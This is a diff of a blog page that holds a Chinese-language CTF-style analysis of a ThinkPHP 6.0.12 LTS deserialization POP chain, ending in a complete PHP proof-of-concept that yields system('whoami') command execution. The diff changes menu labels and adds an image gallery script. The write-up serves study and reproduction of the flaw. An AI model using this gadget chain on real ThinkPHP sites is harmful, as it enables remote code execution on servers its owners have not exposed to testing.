@@ -104,7 +104,7 @@
      --><!--
        --><li><a href="/about/">About</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
@@ -118,6 +118,8 @@
         
         <li><a class="icon" aria-label="Previous post" href="/2022/07/01/vulnstack1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/05/07/swctf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -192,7 +194,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在半个月前的CISCN线上初赛的时候碰到了一道关于ThinkPHP6.0.12LTS反序列化漏洞的题目，当时解题是直接用的网上的POC，没有细致的研究这个漏洞POP链的挖掘，这篇文章就对这个漏洞进行一个复现和分析。</p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在半个月前的CISCN线上初赛的时候碰到了一道关于ThinkPHP6.0.12LTS反序列化漏洞的题目，当时解题是直接用的网上的POC，没有细致的研究这个漏洞POP链的挖掘，这篇文章就对这个漏洞进行一个复现和分析。</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
 <li><p>PHP8.0.2</p>
 </li>
@@ -204,84 +206,89 @@
 
 <p>这里需要注意的是，thinkphp6需要用到php7.1以上才能下载。</p>
 <h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><p>反序列化的入口一般是<code>__wake()</code>、<code>__destruct()</code>或者<code>__construct()</code>，所以我们直接全局搜索，定位到<code>vendor\topthink\think-orm\src\Model.php</code>：</p>
-<p><img src="/images/62aee6a109475431296c5c06.png" alt="image-20220619135204692"></p>
+<p><a href="/images/62aee6a109475431296c5c06.png" title="image-20220619135204692" class="gallery-item"><img src="/images/62aee6a109475431296c5c06.png" alt="image-20220619135204692"></a></p>
 <p>可以发现当<code>$this-&gt;lazySave</code>为true时，就会执行<code>$this-&gt;save()</code>。继续跟进<code>$this-&gt;save()</code>：</p>
-<p><img src="/images/62aee6b209475431296c70d7.png" alt="image-20220619135706565"></p>
+<p><a href="/images/62aee6b209475431296c70d7.png" title="image-20220619135706565" class="gallery-item"><img src="/images/62aee6b209475431296c70d7.png" alt="image-20220619135706565"></a></p>
 <p>其中漏洞方法为<code>updateData()</code>。因此我们需要先绕过第一个if语句：</p>
-<p><img src="/images/62aee6bb09475431296c7d13.png" alt="image-20220619135755379"></p>
+<p><a href="/images/62aee6bb09475431296c7d13.png" title="image-20220619135755379" class="gallery-item"><img src="/images/62aee6bb09475431296c7d13.png" alt="image-20220619135755379"></a></p>
 <p>跟进<code>$this-&gt;isEmpty()</code>方法：</p>
-<p><img src="/images/62aee6d009475431296c995a.png" alt="image-20220619135854188"></p>
+<p><a href="/images/62aee6d009475431296c995a.png" title="image-20220619135854188" class="gallery-item"><img src="/images/62aee6d009475431296c995a.png" alt="image-20220619135854188"></a></p>
 <p>发现这里判断<code>$this-&gt;data</code>这个变量是否为空，绕过也很简单，给<code>$this-&gt;data</code>赋值即可。接着跟进<code>$this-&gt;trigger()</code>：</p>
-<p><img src="/images/62aee6d909475431296ca4e9.png" alt="image-20220619140138544"></p>
+<p><a href="/images/62aee6d909475431296ca4e9.png" title="image-20220619140138544" class="gallery-item"><img src="/images/62aee6d909475431296ca4e9.png" alt="image-20220619140138544"></a></p>
 <p>发现只要我们将<code>$this-&gt;withEvent</code>设为false，那么<code>$this-&gt;trigger()</code>就会返回true，从而使得<code>false===true</code>，结果为false，成功绕过if来到536行的反序列化链漏洞点：</p>
-<p><img src="/images/62aee6e509475431296cb323.png" alt="image-20220619140416516"></p>
+<p><a href="/images/62aee6e509475431296cb323.png" title="image-20220619140416516" class="gallery-item"><img src="/images/62aee6e509475431296cb323.png" alt="image-20220619140416516"></a></p>
 <p>这里将<code>$this-&gt;exists</code>设为true即可调用<code>$this-&gt;updateData</code>方法。跟进<code>$this-&gt;updateData()</code>：</p>
-<p><img src="/images/62aee6f209475431296cc2c2.png" alt="image-20220619140556139"></p>
+<p><a href="/images/62aee6f209475431296cc2c2.png" title="image-20220619140556139" class="gallery-item"><img src="/images/62aee6f209475431296cc2c2.png" alt="image-20220619140556139"></a></p>
 <p>这里调用了<code>$this-&gt;checkAllowFields()</code>方法，跟进一下：</p>
-<p><img src="/images/62aee70309475431296cd695.png" alt="image-20220619140704310"></p>
+<p><a href="/images/62aee70309475431296cd695.png" title="image-20220619140704310" class="gallery-item"><img src="/images/62aee70309475431296cd695.png" alt="image-20220619140704310"></a></p>
 <p>跟进后，发现这里调用了<code>$this-&gt;db()</code>方法，继续跟进<code>$this-&gt;db</code>方法：</p>
-<p><img src="/images/62aee70f09475431296ce4a0.png" alt="image-20220619140910082"></p>
+<p><a href="/images/62aee70f09475431296ce4a0.png" title="image-20220619140910082" class="gallery-item"><img src="/images/62aee70f09475431296ce4a0.png" alt="image-20220619140910082"></a></p>
 <p>发现如果<code>$this-&gt;table</code>不为空的话，就会将<code>$this-&gt;table</code>与<code>$this-&gt;suffix</code>进行拼接，同时调用table方法进行处理。这里进行了拼接操作，因此我们可以全局搜索一下是否有<code>__toString()</code>方法，这样我们只需要将<code>$this-&gt;table</code>和<code>$this-&gt;suffix</code>其中一个赋值为<code>__toString()</code>所在的类，即可调用该<code>__toString</code>方法。全局搜索后，定位到vendor\topthink\think-orm\src\model\concern\Conversion.php：</p>
-<p><img src="/images/62aee72609475431296d024c.png" alt="image-20220619141533127"></p>
+<p><a href="/images/62aee72609475431296d024c.png" title="image-20220619141533127" class="gallery-item"><img src="/images/62aee72609475431296d024c.png" alt="image-20220619141533127"></a></p>
 <p>这里调用了<code>$this-&gt;toJsong()</code>方法，跟进一下：</p>
-<p><img src="/images/62aee72f09475431296d0d84.png" alt="image-20220619141610797"></p>
+<p><a href="/images/62aee72f09475431296d0d84.png" title="image-20220619141610797" class="gallery-item"><img src="/images/62aee72f09475431296d0d84.png" alt="image-20220619141610797"></a></p>
 <p>继续跟进<code>$this-&gt;toArray()</code>：</p>
-<p><img src="/images/62aee73b09475431296d1b5b.png" alt="image-20220619141912697"></p>
+<p><a href="/images/62aee73b09475431296d1b5b.png" title="image-20220619141912697" class="gallery-item"><img src="/images/62aee73b09475431296d1b5b.png" alt="image-20220619141912697"></a></p>
 <p>发现这里的<code>$data</code>变量是将<code>$this-&gt;data</code>与<code>$this-&gt;relation</code>进行合并，接着遍历<code>$data</code>这个数组，最终执行图中箭头所示的代码，执行<code>$this-&gt;getAttr($key)</code>。可以发现如果我们可以控制<code>$this-&gt;data</code>和<code>$this-&gt;relation</code>其一，我们就可以控制这个<code>$key</code>，也就是控制<code>$this-&gt;getAttr()</code>的参数。那么跟进一下<code>$this-&gt;getAttr()</code>：</p>
-<p><img src="/images/62aee74709475431296d2c2c.png" alt="image-20220619142339508"></p>
+<p><a href="/images/62aee74709475431296d2c2c.png" title="image-20220619142339508" class="gallery-item"><img src="/images/62aee74709475431296d2c2c.png" alt="image-20220619142339508"></a></p>
 <p>发现这里的<code>$this-&gt;getData()</code>传入了我们的可控参数<code>$name</code>，跟进一下：</p>
-<p><img src="/images/62aee75409475431296d3d38.png" alt="image-20220619142609634"></p>
+<p><a href="/images/62aee75409475431296d3d38.png" title="image-20220619142609634" class="gallery-item"><img src="/images/62aee75409475431296d3d38.png" alt="image-20220619142609634"></a></p>
 <p><code>$this-&gt;getRealFieldName()</code>方法中传入了可控参数<code>$name</code>，继续跟进：</p>
-<p><img src="/images/62aee76309475431296d500d.png" alt="image-20220619142828483"></p>
+<p><a href="/images/62aee76309475431296d500d.png" title="image-20220619142828483" class="gallery-item"><img src="/images/62aee76309475431296d500d.png" alt="image-20220619142828483"></a></p>
 <p>发现这里默认返回的就是我们传入的可控参数<code>$name</code>。那么也就是说<code>getData()</code>中的<code>$fieldName</code>可控，那么紧接着的是<code>getData()</code>中返回的值（<code>$this-&gt;data[$filedName]</code>）可控，然后就是<code>getAttr()</code>中的<code>$value</code>可控，这一点可以通过观察上面三副图片可以知道。</p>
 <p>发现<code>getAttr()</code>中的<code>$value</code>可控，那么接下来就是<code>getAttr()</code>中的<code>$this-&gt;getValue()</code>了，跟进一下：</p>
-<p><img src="/images/62aee77609475431296d6b85.png" alt="image-20220619143734568"></p>
+<p><a href="/images/62aee77609475431296d6b85.png" title="image-20220619143734568" class="gallery-item"><img src="/images/62aee77609475431296d6b85.png" alt="image-20220619143734568"></a></p>
 <p>其中<code>$fieldName = $this-&gt;getRealFieldName($name);</code>，<code>getRealFieldName()</code>我们刚刚看了，默认返回的就是<code>$name</code>，因此这里的<code>$fieldName</code>的值就是<code>$name</code>。接着审计，可以发现<code>$this-&gt;getJsonValue()</code>中传入的两个参数都是我们可控的。跟进一下这个函数：</p>
-<p><img src="/images/62aee79c09475431296da44a.png" alt="image-20220619143938750"></p>
+<p><a href="/images/62aee79c09475431296da44a.png" title="image-20220619143938750" class="gallery-item"><img src="/images/62aee79c09475431296da44a.png" alt="image-20220619143938750"></a></p>
 <p>我们看一下我们可控的参数：<code>$name</code>,<code>$value</code>,<code>$this-&gt;withAttr</code>。审计一下这段遍历数组的部分，因为这里遍历的是<code>$this-&gt;withAttr[$name]</code>，因此我们需要将<code>$this-&gt;withAttr[$name]</code>设为一个数组。并且还可以发现<code>$value</code>也应该是一个数组。那么至此思路就很明显了：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;data=[<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]] <span class="comment"># $name此时为&#x27;rainb0w&#x27;,$value为[&#x27;temp&#x27;=&gt;&#x27;whoami&#x27;]</span></span><br><span class="line">进入<span class="title function_ invoke__">getJsonValue</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withAttr=[<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]] </span><br><span class="line">进行遍历操作时，遍历的数组就是<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&#x27;rainb0w&#x27;</span>],也就是[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]这个数组。其中<span class="variable">$key</span>为temp,<span class="variable">$closure</span>为system</span><br><span class="line"><span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>，进入<span class="keyword">if</span></span><br><span class="line"><span class="variable">$value</span>[<span class="string">&#x27;temp&#x27;</span>] = <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>,<span class="variable">$value</span>)</span><br></pre></td></tr></table></figure>
 
 <p>起初我以为<code>$value[&#39;temp&#39;] = system(&#39;whoami&#39;,$value)</code>这里并不能执行成功，后来在本地测试了一下，结果如下：</p>
-<p><img src="/images/62aee7ac09475431296dbb77.png" alt="image-20220619152556438"></p>
+<p><a href="/images/62aee7ac09475431296dbb77.png" title="image-20220619152556438" class="gallery-item"><img src="/images/62aee7ac09475431296dbb77.png" alt="image-20220619152556438"></a></p>
 <p>至此POP链已经找完了。接下来就是写POC了。不过在写POC的之前，我们先在app&#x2F;controller&#x2F;index.php中加入我们的测试代码：</p>
-<p><img src="/images/62aee7f909475431296e2376.png"></p>
+<p><a href="/images/62aee7f909475431296e2376.png" class="gallery-item"><img src="/images/62aee7f909475431296e2376.png"></a></p>
 <h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>首先入口是Model类中的<code>__desruct()</code>方法：</p>
-<p><img src="/images/62aee7bc09475431296dd17a.png" alt="image-20220619152751168"></p>
+<p><a href="/images/62aee7bc09475431296dd17a.png" title="image-20220619152751168" class="gallery-item"><img src="/images/62aee7bc09475431296dd17a.png" alt="image-20220619152751168"></a></p>
 <p>这里需要将<code>$this-&gt;lazySave</code>设为true，接着进入<code>$this-&gt;save()</code>：</p>
-<p><img src="/images/62aee81e09475431296e524b.png" alt="image-20220619152841383"></p>
+<p><a href="/images/62aee81e09475431296e524b.png" title="image-20220619152841383" class="gallery-item"><img src="/images/62aee81e09475431296e524b.png" alt="image-20220619152841383"></a></p>
 <p>这里需要将<code>$this-&gt;data</code>不设为空，使得<code>$this-&gt;isEmpty()</code>的值为false。<code>$this-&gt;withEvent</code>设为false，使得<code>$this-&gt;trigger()</code>返回ture，从而使得false&#x3D;&#x3D;&#x3D;true，绕过if。接着将<code>$this-&gt;exists</code>的值设为true，执行<code>$this-&gt;updateData()</code>。</p>
 <p>因此此时的POC如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这样一部分一部分地写POC也是为了更方便的去了解整个POC的编写流程。继续根据上面的分析，编写POC。</p>
 <p>接下来就是从跟进<code>$this-&gt;updateData()</code>那里开始了，发现需要将<code>$this-&gt;table</code>和<code>$this-&gt;suffix</code>这两个其中一个new一个<code>Conversion</code>类，但是需要注意的是，<code>Conversion</code>类是被trait修饰的类，并不是一个可实例化的类：</p>
-<p><img src="/images/62aee82f09475431296e660d.png" alt="image-20220619154214044"></p>
+<p><a href="/images/62aee82f09475431296e660d.png" title="image-20220619154214044" class="gallery-item"><img src="/images/62aee82f09475431296e660d.png" alt="image-20220619154214044"></a></p>
 <p>这是文档中关于trait的解释：</p>
-<p><img src="/images/62aee84109475431296e7cb1.png" alt="image-20220619154300792"></p>
+<p><a href="/images/62aee84109475431296e7cb1.png" title="image-20220619154300792" class="gallery-item"><img src="/images/62aee84109475431296e7cb1.png" alt="image-20220619154300792"></a></p>
 <p>因此接下来，我们需要找一下谁use了这个<code>Conversion</code>类，全局搜索一下，发现正是刚刚的<code>Model</code>类：</p>
-<p><img src="/images/62aee84b09475431296e8891.png" alt="image-20220619154619063"></p>
+<p><a href="/images/62aee84b09475431296e8891.png" title="image-20220619154619063" class="gallery-item"><img src="/images/62aee84b09475431296e8891.png" alt="image-20220619154619063"></a></p>
 <p>但是<code>Model</code>类是个抽象类abstract，也无法被调用，我们需要再找一下谁use了<code>Model</code>类，继续全局搜索，有符合的很多类，但是大多数师傅们都选的是这个<code>Pivot</code>类，因此我们这里也来使用一下吧：</p>
-<p><img src="/images/62aee85509475431296e9534.png" alt="image-20220619154957327"></p>
+<p><a href="/images/62aee85509475431296e9534.png" title="image-20220619154957327" class="gallery-item"><img src="/images/62aee85509475431296e9534.png" alt="image-20220619154957327"></a></p>
 <p>继续编写一部分POC：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">​</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>接着从<code>toJson()</code>那里的分析往下看：</p>
-<p><img src="/images/62aee86b09475431296eb265.png" alt="image-20220619160012428"></p>
+<p><a href="/images/62aee86b09475431296eb265.png" title="image-20220619160012428" class="gallery-item"><img src="/images/62aee86b09475431296eb265.png" alt="image-20220619160012428"></a></p>
 <p>这里的$data的值就是<code>$this-&gt;data</code>的值，调用了<code>$this-&gt;getAttr($key)</code>，其中的$key就是<code>$this-&gt;data</code>中的’rainb0w’。跟进<code>$this-&gt;getAttr()</code>：</p>
-<p><img src="/images/62aee88609475431296ed28b.png" alt="image-20220619160345824"></p>
+<p><a href="/images/62aee88609475431296ed28b.png" title="image-20220619160345824" class="gallery-item"><img src="/images/62aee88609475431296ed28b.png" alt="image-20220619160345824"></a></p>
 <p>根据上面的分析，这个$value就是<code>$this-&gt;data[&#39;rainb0w&#39;]</code>。接着从跟进<code>$this-&gt;getValue()</code>的分析那里继续走：</p>
-<p><img src="/images/62aee8dd09475431296f42c0.png"></p>
+<p><a href="/images/62aee8dd09475431296f42c0.png" class="gallery-item"><img src="/images/62aee8dd09475431296f42c0.png"></a></p>
 <p>如果想调用<code>$this-&gt;getJsonValue()</code>，我们就要进入if语句。因此<code>$this-&gt;json</code>应该被设为<code>array(&#39;rainb0w&#39;)</code>，<code>$this-&gt;withAttr[&#39;rainb0w&#39;]</code>应该是一个数组。</p>
 <p>到<code>getJsonValue()</code>：</p>
-<p><img src="/images/62aee89909475431296ee9b4.png" alt="image-20220619160541293"></p>
+<p><a href="/images/62aee89909475431296ee9b4.png" title="image-20220619160541293" class="gallery-item"><img src="/images/62aee89909475431296ee9b4.png" alt="image-20220619160541293"></a></p>
 <p>这里的<code>$this-&gt;withAttr</code>需要的值也在上面的分析中给出，同时也要让<code>$this-&gt;jsonAssoc</code>的值应该是true，这样才能进入if中。因此可以编写出全部的POC了：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = <span class="keyword">array</span>(<span class="string">&#x27;rainb0w&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="测试利用"><a href="#测试利用" class="headerlink" title="测试利用"></a>测试利用</h2><p>首先确保index.php中已经写了反序列化点，比如：</p>
-<p><img src="/images/62aee91609475431296f81b0.png" alt="image-20220619164738089"></p>
+<p><a href="/images/62aee91609475431296f81b0.png" title="image-20220619164738089" class="gallery-item"><img src="/images/62aee91609475431296f81b0.png" alt="image-20220619164738089"></a></p>
 <p>接着去浏览器传一下payload，弹个计算器玩玩:</p>
-<p><img src="/images/62aee91f09475431296f8cf0.png" alt="image-20220619164901055"></p>
-
+<p><a href="/images/62aee91f09475431296f8cf0.png" title="image-20220619164901055" class="gallery-item"><img src="/images/62aee91f09475431296f8cf0.png" alt="image-20220619164901055"></a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -304,7 +311,7 @@
         
           <li><a href="/about/">About</a></li>
         
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
         
           <li><a href="/tags/">tags</a></li>
         
@@ -366,7 +373,7 @@
      --><!--
        --><li><a href="/about/">About</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
